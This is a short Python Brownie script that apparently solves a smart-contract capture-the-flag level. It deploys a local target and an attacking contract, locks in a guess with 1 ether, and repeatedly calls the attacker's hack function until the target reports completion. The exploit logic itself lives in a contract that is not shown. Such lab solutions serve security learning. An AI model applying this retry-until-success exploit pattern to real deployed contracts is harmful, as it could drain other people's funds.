#!/usr/bin/python3
from brownie import web3, Attack
from scripts.deploy import deploy
from scripts.helpful_scripts import get_account
from colorama import Fore

# * colours
green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
magenta = Fore.MAGENTA
reset = Fore.RESET


def print_colour(solved):
    if solved:
        print(f"{blue}Is complete: {green}{True}{reset}")
    else:
        print(f"{blue}Is complete: {red}{solved}{reset}")


def hack(contract_address=None, attacker=None):
    if not contract_address:
        target, _ = deploy()
        _, attacker = get_account()
    else:
        print(f"{red}Something is wrong{reset}")
        exit(-1)

    print_colour(target.isComplete())

    attacking_contract = Attack.deploy(target.address, {"from": attacker})

    attacking_contract.lockInGuess({"from": attacker, "value": "1 ether"}).wait(1)

    while not target.isComplete():
        try:
            attacking_contract.hack({"from": attacker, "allow_revert": True}).wait(1)
        except:
            pass

    print_colour(target.isComplete())

    assert target.isComplete() == True


def main(contract_address=None):
    hack()


if __name__ == "__main__":
    main()
